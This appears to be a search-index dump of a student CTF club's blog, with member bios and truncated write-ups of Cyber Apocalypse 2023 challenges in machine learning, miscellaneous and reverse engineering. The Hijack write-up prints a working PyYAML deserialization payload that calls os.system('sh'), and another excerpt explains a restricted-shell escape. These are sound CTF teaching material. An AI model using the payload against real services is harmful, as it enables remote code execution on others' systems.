[{"authors":["BaoDoktah"],"categories":null,"content":"Hi there! My name is BaoDoktah and I am a Reverse Engineer for BKISC’s blog. With 3 months of experience in the field of cybersecurity, I specialize in analyzing software and hardware systems to understand how they work, how they can be exploited, and how they can be improved. I am passionate about staying up-to-date with the latest trends and techniques in reverse engineering and am always seeking new challenges to sharpen my skills. I look forward to sharing my knowledge and insights with you through this blog!\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"0cd8e2789d6d14c58cabde60f2dcca6c","permalink":"https://blog.bkisc.com/author/baodoktah/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/baodoktah/","section":"authors","summary":"Hi there! My name is BaoDoktah and I am a Reverse Engineer for BKISC’s blog. With 3 months of experience in the field of cybersecurity, I specialize in analyzing software and hardware systems to understand how they work, how they can be exploited, and how they can be improved.","tags":null,"title":"BaoDoktah","type":"authors"},{"authors":null,"categories":null,"content":"Some Background Informations I am FazeCT, a Reverser from team BKISC, HCMC University of Technology. I have been studying in Computer Science, HCMC University of Technology since October 2021.\nStarted playing CTFs since July 2022, currently I am focusly learning in the Reverse Engineering (RE) field of CTF.\nI am also looking forward to learn more about Blockchain in the future.\nNoticeable Achievements Qualified for ISITDTU CTF 2022 Finals\nRanked 57th as HCMUT Last Dance in 2022 ACM-ICPC Asia HoChiMinh City Regional Contest\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"e7c86612d2a48e15b6888aa79a874f7c","permalink":"https://blog.bkisc.com/author/fazect/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/fazect/","section":"authors","summary":"Some Background Informations I am FazeCT, a Reverser from team BKISC, HCMC University of Technology. I have been studying in Computer Science, HCMC University of Technology since October 2021.\nStarted playing CTFs since July 2022, currently I am focusly learning in the Reverse Engineering (RE) field of CTF.","tags":null,"title":"FazeCT","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi my name is Lio. I’m your friendly Pwner from HCMC University of Technology.\nI used to be a noob game developer. Now I’m an even more noob hecker.\nAbsolutely love anime-related stuffs.\nMy favorite number is 1767991380. Bet you can decode this (not my social security number btw).\nIn the meantime, flag{h3r3_15_4_91F7_F0r_y0U}.\nNoticeable Achievements TOP 10 as Fried Rice in GAMEUIT HACKATHON 2022\n","date":1679875200,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1679875200,"objectID":"88fbe8ccb88e37a0b1d6aad2209af406","permalink":"https://blog.bkisc.com/author/lio/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/lio/","section":"authors","summary":"Background Hi my name is Lio. I’m your friendly Pwner from HCMC University of Technology.\nI used to be a noob game developer. Now I’m an even more noob hecker.","tags":null,"title":"Lio","type":"authors"},{"authors":null,"categories":null,"content":"hdthinh1012 (Thinh Huynh Duc) is a Computer Science student studying at Ho Chi Minh University of Technology.\n","date":1673481600,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":1673481600,"objectID":"82f26d50ab3ef4f3c9efe0569c2150db","permalink":"https://blog.bkisc.com/author/hdthinh1012/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/hdthinh1012/","section":"authors","summary":"hdthinh1012 (Thinh Huynh Duc) is a Computer Science student studying at Ho Chi Minh University of Technology.","tags":null,"title":"hdthinh1012","type":"authors"},{"authors":null,"categories":null,"content":"BK Information Security Club BKISC (Bach Khoa Information Security Club) was founded in July 2022 by Dr.Nguyen An Khuong and senior members from Efiens Security Club, consisting mainly of students from Ho Chi Minh University of Technology (HCMUT). We were founded to provide studying, researching, cooperating environments for those interested in cyber security.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"https://blog.bkisc.com/author/bkisc/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/bkisc/","section":"authors","summary":"BK Information Security Club BKISC (Bach Khoa Information Security Club) was founded in July 2022 by Dr.Nguyen An Khuong and senior members from Efiens Security Club, consisting mainly of students from Ho Chi Minh University of Technology (HCMUT).","tags":null,"title":"BKISC","type":"authors"},{"authors":null,"categories":null,"content":"I am cocay.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"b8ca76484410b4e38c809cf56ca31dfa","permalink":"https://blog.bkisc.com/author/cocay/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/cocay/","section":"authors","summary":"I am cocay.","tags":null,"title":"cocay","type":"authors"},{"authors":null,"categories":null,"content":"Background My name is Dang Le, also known under my nickname midas or lkmidas. I’m currently a Research Intern at Northwestern University under the supervision of Dr. Xinyu Xing. Before this, I received my B.Eng in Computer Engineering from Ho Chi Minh City University of Technology in 2022. My current research focus is Kernel Security and a bit of Smart Contract Security. I’m also doing a bit of Reverse Engineering on my own time. In my undergraduate days, I participated in many CTF competitions and achieved several national and international prizes, my main CTF categories were Pwn and RE. Nowadays, I don’t really try hard CTFs for ranking, just play for fun when I have time.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"1ef52903267cd3de24dcb7d8292d0601","permalink":"https://blog.bkisc.com/author/dang-midas-le/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/dang-midas-le/","section":"authors","summary":"Background My name is Dang Le, also known under my nickname midas or lkmidas. I’m currently a Research Intern at Northwestern University under the supervision of Dr. Xinyu Xing. Before this, I received my B.","tags":null,"title":"Dang \"midas\" Le","type":"authors"},{"authors":["dasHaus165"],"categories":null,"content":"Some Background Informations I am dasHaus165, a Cryptographer from team BKISC, HCMC University of Technology.\nI love playing football and I am also a half-season fan of Bayern Munich.\nAchievements Nothing yet.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"e98b336ce73dbd9c2ebf4c7afd4bb5e0","permalink":"https://blog.bkisc.com/author/dashaus165/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/dashaus165/","section":"authors","summary":"Some Background Informations I am dasHaus165, a Cryptographer from team BKISC, HCMC University of Technology.\nI love playing football and I am also a half-season fan of Bayern Munich.\nAchievements Nothing yet.","tags":null,"title":"dasHaus165","type":"authors"},{"authors":null,"categories":null,"content":"I am delk.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"db9717b820c3bfd56c6101276628310e","permalink":"https://blog.bkisc.com/author/delk/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/delk/","section":"authors","summary":"I am delk.","tags":null,"title":"delk","type":"authors"},{"authors":["HappyHacker22"],"categories":null,"content":"About me I’m HappyHacker22. I have joined BKISC since 7/2022. I am a CTF player specializing in Cryptography. But I take interest in IoT and VLSI too as a Computer Engineering student.\nA bit less academic about me :\nBadminton and ping-pong Chess and Chinese Chess League of Legend (Silver btw), T1 fan Osu! player Achievements SVATTT Quals 2022 : Consolation Prize in team COPIUM NSUCRYPTO 2022 : Bronze prize with senior catperson Not failing any subjects in Bach Khoa University ","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"7a6965a237010014ad495a9547f49b66","permalink":"https://blog.bkisc.com/author/happyhacker22/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/happyhacker22/","section":"authors","summary":"About me I’m HappyHacker22. I have joined BKISC since 7/2022. I am a CTF player specializing in Cryptography. But I take interest in IoT and VLSI too as a Computer Engineering student.","tags":null,"title":"HappyHacker22","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi, I’m Khang Vo, also known as doublevkay, and I am a passionate cyber security researcher and a graduate of HCMUT with a degree in Computer Science.\nDuring my time as a student, I was an active player in Capture the Flag (CTF) competitions, specifically focusing on web-related challenges. This experience ignited my passion for cybersecurity and led me to specialize in this field.\nAt present, my main focus is on penetration testing, devsecops, and static application security testing, especially using CodeQL to identify and fix security vulnerabilities in software applications. Additionally, I continuously update my knowledge of blockchain-based applications’ security.\nRecently, I have been glad to be a mentor for talented students at the BKISC club who share the same passion for cyber security. I hope to inspire and support the next generation of Bach Khoa security professionals.\nI enjoy contributing to the cyber security community by sharing my findings and insights. You can find my open-source projects on GitHub, and you can reach out to me on Twitter.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"9457c9d7d10348791aab00fe4712b61b","permalink":"https://blog.bkisc.com/author/khang-vo-doublevkay/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/khang-vo-doublevkay/","section":"authors","summary":"Background Hi, I’m Khang Vo, also known as doublevkay, and I am a passionate cyber security researcher and a graduate of HCMUT with a degree in Computer Science.\nDuring my time as a student, I was an active player in Capture the Flag (CTF) competitions, specifically focusing on web-related challenges.","tags":null,"title":"Khang Vo (doublevkay)","type":"authors"},{"authors":null,"categories":null,"content":"Info of me Hello, I am Lê Hoàng, a Web player of team BKISC, Hồ Chí Minh city University of Technology. Currently, I am learning in the field of Computer Science. I am interested in cybersecurity and the ways in which we can protect our digital assets from threats.\nThrough my coursework and personal projects, I have gained experience in programming languages such as C++, Golang, Python, Java, JavaScript and PHP (misery).\nAt the momment, I am trying to comprehend the vast ammount of knowledge of cryptography and having my free time invested on game hacking as a hobby.\nCurrent Achievements Qualified for ISITDTU CTF 2022 Finals\n10th place for ASCIS 2022\nQualified for ASCIS 2022 Finals\nHave not failed on any subjects at Ho Chi Minh University of Technology\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"144496c7ef3996947738eb132df5c380","permalink":"https://blog.bkisc.com/author/le-hoang/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/le-hoang/","section":"authors","summary":"Info of me Hello, I am Lê Hoàng, a Web player of team BKISC, Hồ Chí Minh city University of Technology. Currently, I am learning in the field of Computer Science.","tags":null,"title":"Lê Hoàng","type":"authors"},{"authors":null,"categories":null,"content":"About me Hi, I’m Nghia Tran aka Leon, a Web player of team BKISC. I am a final-year student with a passion for cyber security.\nI am excited to continue exploring the fascinating world of cyber security and applying my skills to real-world challenges.\nCertificates Cybersecurity Pathway issued by Cisco\nIBM Cybersecurity Analyst authorized by IBM\nMore\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"7f5765d0b02032c4a10fb99999859b65","permalink":"https://blog.bkisc.com/author/leon/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/leon/","section":"authors","summary":"About me Hi, I’m Nghia Tran aka Leon, a Web player of team BKISC. I am a final-year student with a passion for cyber security.\nI am excited to continue exploring the fascinating world of cyber security and applying my skills to real-world challenges.","tags":null,"title":"Leon","type":"authors"},{"authors":null,"categories":null,"content":"I am Dinh, Final-year student of the HCMUT. I used to be a Pwn Player at CTF team of HCMUT, but currently I am trying something new in blockchain security, web3 and smart contract. Hope this will work !!!\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"3d6e1cbc13305ac78fa919e5428d1d1a","permalink":"https://blog.bkisc.com/author/lsd1nh/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/lsd1nh/","section":"authors","summary":"I am Dinh, Final-year student of the HCMUT. I used to be a Pwn Player at CTF team of HCMUT, but currently I am trying something new in blockchain security, web3 and smart contract.","tags":null,"title":"lsd1nh","type":"authors"},{"authors":["meterglost"],"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"53c4486a0e25e774163549a8a782bd28","permalink":"https://blog.bkisc.com/author/meterglost/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/meterglost/","section":"authors","summary":"","tags":null,"title":"meterglost","type":"authors"},{"authors":["Nguyễn An Khương"],"categories":null,"content":"Dr. Nguyen An Khuong is a lecturer and researcher at the Faculty of Computer Science and Engineering, Ho Chi Minh City University of Technology (HCMUT). He receives his PhD in Mathematics from the University of Groningen, The Netherlands in 2008. Among of his current interests are applied cryptography, blockchain technology, and applied machine learning.\nIn terms of services, he was a member of the editorial board of the Bulletin of Vietnamese Mathematical Society (2012-2018), and contributed to the Vietnamese editions of “Modern Industrial Statistics: with applications in R, MINITAB and JMP” by R. Kenett, S. Zacks and “Elements” by Euclid of Alexandria as a co-translator. He is also a mentor and supervisor for Efiens team and BKISC team from HCMUT. His research profile is available at https://scholar.google.com/citations?user=ha11OwIAAAAJ\u0026amp;hl=vi\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"f49ea8a282d107f926e610dccbe0d71c","permalink":"https://blog.bkisc.com/author/nguyen-an-khuong/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/nguyen-an-khuong/","section":"authors","summary":"Dr. Nguyen An Khuong is a lecturer and researcher at the Faculty of Computer Science and Engineering, Ho Chi Minh City University of Technology (HCMUT). He receives his PhD in Mathematics from the University of Groningen, The Netherlands in 2008.","tags":null,"title":"Nguyễn An Khương","type":"authors"},{"authors":null,"categories":null,"content":"Background I am Onirique, also known as Junvalentine, currently studying in the field of Applied Cryptography (absolute noob).\nLove traveling and football (a royal fan of Man United).\nAlso doing Competitive Programming on Codeforces for fun.\nAchievements Qualified for ISITDTU CTF 2022 Finals\nHonorable Mention at National Olympics in Informatics (2022)\nRanked 57th as HCMUT Last Dance in 2022 ACM-ICPC Asia HoChiMinh City Regional Contest\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"20c445a403d17f2d54ecc50c70677e8c","permalink":"https://blog.bkisc.com/author/onirique/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/onirique/","section":"authors","summary":"Background I am Onirique, also known as Junvalentine, currently studying in the field of Applied Cryptography (absolute noob).\nLove traveling and football (a royal fan of Man United).\nAlso doing Competitive Programming on Codeforces for fun.","tags":null,"title":"Onirique","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi, I’m QuiUzumaki, a Computer Science student and a member of team BKISC, Ho Chi Minh University of Technology.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"256dc2f9c4e38fd7696be76d001a4385","permalink":"https://blog.bkisc.com/author/quiuzumaki-qui-do/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/quiuzumaki-qui-do/","section":"authors","summary":"Background Hi, I’m QuiUzumaki, a Computer Science student and a member of team BKISC, Ho Chi Minh University of Technology.","tags":null,"title":"QuiUzumaki (Qui Do)","type":"authors"},{"authors":null,"categories":null,"content":"Background Hi, My name is Hoàng Long, aka TN, a Cryptographer from team BKISC, HCMC University of Technology.\nFun facts:\nI have a Chemical Engineering background I am a Yasuo main in League of Legends (D1 actually) hehe Sudoku enjoyer KPOP is life TN stands for “Hasagi” Achievements ACSC 2023 Quals: Ranked 6th in Viet Nam\nCRYPTOHACK: 4th place in Viet Nam\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"d719fc467e13558b6d9bf0feb333480c","permalink":"https://blog.bkisc.com/author/tn/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/author/tn/","section":"authors","summary":"Background Hi, My name is Hoàng Long, aka TN, a Cryptographer from team BKISC, HCMC University of Technology.\nFun facts:\nI have a Chemical Engineering background I am a Yasuo main in League of Legends (D1 actually) hehe Sudoku enjoyer KPOP is life TN stands for “Hasagi” Achievements ACSC 2023 Quals: Ranked 6th in Viet Nam","tags":null,"title":"TN","type":"authors"},{"authors":["BaoDoktah"],"categories":null,"content":" Table of Contents Reconfiguration Mysterious Learnings Last Hope On The Rescue Reconfiguration Given zip: Get it here!\nDescription: As Pandora set out on her quest to find the ancient alien relic, she knew that the journey would be treacherous. The desert was vast and unforgiving, and the harsh conditions would put her cyborg body to the test. Pandora started by collecting data about the temperature and humidity levels in the desert. She used a scatter plot in an Orange Workspace file to visualize this data and identified the areas where the temperature was highest and the humidity was lowest. Using this information, she reconfigured her sensors to better withstand the extreme heat and conserve water. But, a second look at the data revealed something otherwordly, it seems that the relic’s presence beneath the surface has scarred the land in a very peculiar way, can you see it?\nCategory: Machine Learning\nIn this challenge, we embarked on a quest to find an ancient alien relic hidden beneath the desert, following the footsteps of the cyborg Pandora. The task involved analyzing temperature and humidity data and uncovering peculiar patterns that hinted at the relic’s presence.\nTo begin the analysis, we downloaded and installed the Orange data mining tool, which is an open-source data visualization and analysis tool for data scientists. You can download it here: https://orange.biolab.si/download/\nAfter installing Orange, we opened the tool and loaded the analysis.ows file. We then imported the point.csv file into the Orange workspace by adding the “File” widget and selecting the point.csv file from our computer. Next, we created a scatter plot to visualize the data. We added the “Scatter Plot” widget from “Visualize” panel to the workspace and connected it to the “File” widget.\nBy viewing the “Scatter Plot”, we got the flag:\nFlag is: HTB{sc4tter_pl0ts_4_th3_w1n}\nMysterious Learnings Given zip: Get it here!\nDescription: One day the archeologist came across a strange metal plate covered in uncommon hieroglyphics. It looked like blueprints for some kind of alien technology. “What kind of magic is this?” He studied the plate more closely and was amazed by the advanced technology and incredible engineering they were using at a time like this. This could only lead him in him wanting to learn more…\nCategory: Machine Learning\nIn this challenge, we were given an H5 file containing a pre-trained machine learning model. Our task was to analyze the model and extract a hidden flag.\nH5 file format, also known as Hierarchical Data Format (HDF5), is a versatile data model that can store large amounts of data efficiently. It is widely used in scientific research and engineering for storing and managing data. The format organizes data hierarchically and enables fast I/O operations.\nTo solve this challenge, we first needed to load the model from the H5 file and display its summary. We used TensorFlow and Keras libraries to achieve this. Here is the Python script:\nimport tensorflow as tf from tensorflow import keras # Load the model from the HDF5 file model = keras.models.load_model(\u0026#39;alien.h5\u0026#39;) # Display the model\u0026#39;s summary model.summary() We noticed a few strings in the layer names that seemed to be part of the flag. By combining these strings,decoded it from base64 we were able to construct the flag.\nFlag is: HTB{th3s3_4l13nS_4r3_s00000_b4s1c}\nLast Hope Given zip: Get it here!\nDescription: The quantum data came back and analyzed. DISASTER! Our best scientists all agree: Unfortunately our species and our whole culture are about to be eliminated. Due to abnormal behavior of the black hole’s singularity our planet is about to get swallowed. Project “ONESHOT” is our last hope…\nCategory: Machine Learning\nIn this challenge, we are given a file containing OpenQASM 2.0 code, which represents a quantum circuit. Our goal is to execute the circuit and extract the flag, which is encoded in the most frequent bitstring resulting from the measurement of the quantum circuit.\nHere’s a brief write-up of the steps taken to solve this challenge:\nWe start by reading the OpenQASM code from the file named ‘quantum_artifact.qasm’ and store it as a string.\nNext, we use Qiskit, a Python library for quantum computing, to convert the OpenQASM code into a QuantumCircuit object.\nWe set up a quantum simulator using Qiskit’s Aer module, which allows us to simulate quantum circuits on classical computers.\nWe transpile the circuit, optimizing it for the simulator.\nWe execute the transpiled circuit on the simulator with 1024 shots, meaning the circuit is run 1024 times, and store the result.\nFrom the result, we extract the counts, which is a dictionary containing the frequency of each bitstring.\nWe iterate through the counts and find the most frequent bitstring, which is the binary representation of our flag.\nWe convert the most frequent bitstring to a text string by splitting it into groups of 8 bits (1 byte) and using the int() and chr() functions to convert …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"d676d190107cd280d7490463c331b9fb","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-ml/","publishdate":"2023-03-27T01:00:00Z","relpermalink":"/blog/bkisc/htb2023-ml/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Machine Learning category.","tags":["ctf","writeup","machine learning","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Machine Learning","type":"blog"},{"authors":["FazeCT","le-hoang","Lio"],"categories":null,"content":" Table of Contents Persistence Hijack Restricted Remote computation Janken nehebkaus trap The Chasm’s Crossing Conundrum Persistence Description: Thousands of years ago, sending a GET request to /flag would grant immense power and wisdom. Now it’s broken and usually returns random data, but keep trying, and you might get lucky… Legends say it works once every 1000 tries.\nNote: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\nCategory: Miscellaneous\nDifficulty: Very Easy\nWe are given a website to work with. Initially, connection to the website would result in “404 Not Found”. I then went to read the descriptions, and from it, I got to know that we should send at least 1000 GET requests to /flag to maybe get the flag.\nI used this below Python script to automate the task.\nimport requests url = \u0026#34;http://64.227.41.83:30380/flag\u0026#34; for i in range(10000): response = requests.get(url) content = response.content if b\u0026#39;HTB{\u0026#39; in content: print(content) break After a short wait, we got the flag.\nFlag is: HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}\nHijack Description: The security of the alien spacecrafts did not prove very robust, and you have gained access to an interface allowing you to upload a new configuration to their ship’s Thermal Control System. Can you take advantage of the situation without raising any suspicion?\nNote: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\nCategory: Miscellaneous\nDifficulty: Easy\nLet’s try to connect to the challenge instance.\nAnd let’s try to test out those options.\nISFweXRob24vb2JqZWN0Ol9fbWFpbl9fLkNvbmZpZyB7SVJfc3BlY3Ryb21ldGVyX3RlbXA6ICcxNScsIGF1dG9fY2FsaWJyYXRpb246ICdvbicsCiAgcHJvcHVsc2lvbl90ZW1wOiAnMzQzNCcsIHNvbGFyX2FycmF5X3RlbXA6ICcxMicsIHVuaXRzOiBmfQo=\nThe function in question generates a base64 encoded string representing a serialized object. To provide some context, serialization is the process of storing an object, such as an array or class, in a database for later retrieval. When the application needs to access the object, it unserializes it, or loads it from the database using a function. This can improve the efficiency of Object-Oriented Programming.\nIt is important to note, however, that serialized objects should not be vulnerable to manipulation by users. If a user creates a malicious object, it could execute unwanted code. This challenge illustrates this point by presenting us with a serialized object and its corresponding base64 encoding. This is just one example of how serialized objects can be used, and it is essential to be aware of their potential risks.\nLet’s take a look at the next options. The application is requesting a base64 encoded string of a serialized object.\nUpon examining the serialized object provided by the application, I have determined that it is a YAML-formatted Python serialized object. This article serves as an excellent illustration of how attackers can leverage YAML-based exploits to execute arbitrary code.\nHere is the script to generate a serialized object.\nimport yaml import os import base64 class Test(object): def __reduce__(self): return (os.system, (\u0026#39;sh\u0026#39;,)) serialized_data = yaml.dump(Test()) # serializing data print(base64.b64encode(serialized_data.encode()).decode()) Let’s grab the result and throw it to the application.\nFlag is: HTB{1s_1t_ju5t_m3_0r_iS_1t_g3tTing_h0t_1n_h3r3?}\nRestricted Given file: Get it here!\nDescription: You ’re still trying to collect information for your research on the alien relic. Scientists contained the memories of ancient egyptian mummies into small chips, where they could store and replay them at will. Many of these mummies were part of the battle against the aliens and you suspect their memories may reveal hints to the location of the relic and the underground vessels. You managed to get your hands on one of these chips but after you connected to it, any attempt to access its internal data proved futile. The software containing all these memories seems to be running on a restricted environment which limits your access. Can you find a way to escape the restricted environment?\nNote: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\nCategory: Miscellaneous\nDifficulty: Easy\nWe are provided with a server and it’s source. From the source, we know that it is a SSH server.\nOne thing particular about this server is that, if the username is restricted, we will not need to provide a password to authenticate, but the user will be in restricted shell mode.\nTo cope with this, we can use a trick called SSH self loop-back, which means we initiate a SSH connection inside a SSH, since restricted shell doesn’t prevent us from using SSH commands.\nFirst, we connect to the SSH server using the username restricted.\nFrom the source, we also know that the exposed port is 1337. …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"5e26625f4f556ad43ac815c4a147c0c0","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-misc/","publishdate":"2023-03-27T01:00:00Z","relpermalink":"/blog/bkisc/htb2023-misc/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Miscellaneous category.","tags":["ctf","writeup","misc","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Miscellaneous","type":"blog"},{"authors":["FazeCT","BaoDoktah"],"categories":null,"content":" Table of Contents Shattered Tablet Needle in a Haystack She Shells C Shells Hunting License Cave System Alien Saboteur Somewhat Linear Analogue Signal Processing v2 Original Posts Shattered Tablet Given file: Get it here!\nDescription: Deep in an ancient tomb, you’ve discovered a stone tablet with secret information on the locations of other relics. However, while dodging a poison dart, it slipped from your hands and shattered into hundreds of pieces. Can you reassemble it and read the clues?\nCategory: Reverse Engineering\nDifficulty: Very Easy\nReverse Engineering category greets us with a binary. I used IDA Pro to decompile the binary.\nIn the main function, the input is being checked through an if clause.\nI used angr to get the input (you can refer to this and this, too to get the hang of angr).\nHere is the Python script.\nimport angr p = angr.Project(\u0026#39;E:/Downloads/tablet\u0026#39;) simgr = p.factory.simulation_manager(p.factory.entry_state()) simgr.explore(find=0x401359, avoid=0x401367) for i in range(3): print(simgr.found[0].posix.dumps(i)) We have to find the address of puts(“Yes! That’s right!”); and avoid the address of puts(“No… not that”);. Also, we have to increase each of the address by 0x400000 due to the fact that this binary is PIE-enabled.\nFlag is: HTB{br0k3n_4p4rt,n3ver_t0_b3_r3p41r3d}\nNeedle in a Haystack Given file: Get it here!\nDescription: You’ve obtained an ancient alien Datasphere, containing categorized and sorted recordings of every word in the forgotten intergalactic common language. Hidden within it is the password to a tomb, but the sphere has been worn with age and the search function no longer works, only playing random recordings. You don’t have time to search through every recording - can you crack it open and extract the answer?\nCategory: Reverse Engineering\nDifficulty: Very Easy\nWe are given an another binary. Again, load the binary using IDA Pro.\nThis time, the main algorithm of the binary is to print out a random element from the given list, and guess what, the flag is also there!\nFlag is: HTB{d1v1ng_1nt0_th3_d4tab4nk5}\nShe Shells C Shells Given file: Get it here!\nDescription: You’ve arrived in the Galactic Archive, sure that a critical clue is hidden here. You wait anxiously for a terminal to boot up, hiding in the shadows from the guards hunting for you. Unfortunately, it looks like you’ll need a password to get what you need without setting off the alarms…\nCategory: Reverse Engineering\nDifficulty: Very Easy\nWe get another binary, and it’s time to use IDA Pro to decompile it.\nLoad the binary, we notice the function func_flag. Let’s check that out!\nfgets(s, 256, stdin); for ( i = 0; i \u0026lt;= 0x4C; ++i ) s[i] ^= m1[i]; if ( memcmp(s, \u0026amp;t, 0x4DuLL) ) return 0xFFFFFFFFLL; for ( j = 0; j \u0026lt;= 0x4C; ++j ) s[j] ^= m2[j]; printf(\u0026#34;Flag: %s\\n\u0026#34;, s); return 0LL; This is the main part of the function. Our input string s will be used to XOR with two lists, m1 and m2. We can use export data in IDA to dump out the contents of m1 and m2, as shown below (do the same for m2).\nWe also know that after the first XOR, s needs to be equal to t (which we can get from the memory, too). Then we can reverse XOR to find s, and the algorithm looks like this.\nt[i] ^ m1[i] = s[i % 8] Since after the check, we continue to XOR m2 with the modified s (which should be equal to t after the memcmp), we get the algorithm to print out our flag.\nt[i] ^ m2[i] = flag[i] We can use this Python script to get the flag.\nm2 = [ 0x64, 0x1E, 0xF5, 0xE2, 0xC0, 0x97, 0x44, 0x1B, 0xF8, 0x5F, 0xF9, 0xBE, 0x18, 0x5D, 0x48, 0x8E, 0x91, 0xE4, 0xF6, 0xF1, 0x5C, 0x8D, 0x26, 0x9E, 0x2B, 0xA1, 0x02, 0xF7, 0xC6, 0xF7, 0xE4, 0xB3, 0x98, 0xFE, 0x57, 0xED, 0x4A, 0x4B, 0xD1, 0xF6, 0xA1, 0xEB, 0x09, 0xC6, 0x99, 0xF2, 0x58, 0xFA, 0xCB, 0x6F, 0x6F, 0x5E, 0x1F, 0xBE, 0x2B, 0x13, 0x8E, 0xA5, 0xA9, 0x99, 0x93, 0xAB, 0x8F, 0x70, 0x1C, 0xC0, 0xC4, 0x3E, 0xA6, 0xFE, 0x93, 0x35, 0x90, 0xC3, 0xC9, 0x10, 0xE9] t = [0x2C,0x4A,0x0B7,0x99,0x0A3,0x0E5,0x70,0x78,0x93,0x6E,0x97,0x0D9,0x47,0x6D,0x38,0x0BD,0x0FF,0x0BB,0x85,0x99,0x6F,0xE1,0x4A,0x0AB,0x74,0x0C3,0x7B,0x0A8,0x0B2,0x9F,0x0D7,0x0EC,0x0EB,0x0CD,0x63,0x0B2,0x39,0x23,0x0E1,0x84,0x92,0x96,0x09,0x0C6,0x99,0x0F2,0x58,0x0FA,0x0CB,0x6F,0x6F,0x5E,0x1F,0x0BE,0x2B,0x13,0x8E,0x0A5,0x0A9,0x99,0x93,0x0AB,0x8F,0x70,0x1C,0x0C0,0x0C4,0x3E,0x0A6,0x0FE,0x93,0x35,0x90,0x0C3,0x0C9,0x10,0x0E9] for i in range(len(t)): print(end=chr(t[i] ^ m2[i])) Flag is: HTB{cr4ck1ng_0p3n_sh3ll5_by_th3_s34_sh0r3}\nHunting License Given file: Get it here!\nDescription: STOP! Adventurer, have you got an up to date relic hunting license? If you don’t, you’ll need to take the exam again before you’ll be allowed passage into the spacelanes!\nNote: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.\nCategory: Reverse Engineering\nDifficulty: Easy\nWe are given a binary file, together with a netcat server.\nBy analyzing the binary file using file, we can answer some first questions. …","date":1679875200,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1679875200,"objectID":"114ab32d7c46799cba1e2d214fc1afd5","permalink":"https://blog.bkisc.com/blog/bkisc/htb2023-re/","publishdate":"2023-03-27T01:00:00Z","relpermalink":"/blog/bkisc/htb2023-re/","section":"blog","summary":"An in-depth writeup on Cyber Apocalypse 2023 - The Cursed Mission, Reverse Engineering category.","tags":["ctf","writeup","re","htb-2023"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Reverse Engineering","type":"blog"},{"authors":["FazeCT"],"categories":null,"content":" Table of Contents Introduction Finding the location Getting further informations Finding the deleted tweet Exploring the killer’s GitHub Conclusion Introduction Given image: Get it here!\nDescription: I feel the killer might be dangerous so I have some info to give you but I don’t want to disclose my email just like that. So find my review from the image below and send me an email asking for info. Be creative with the 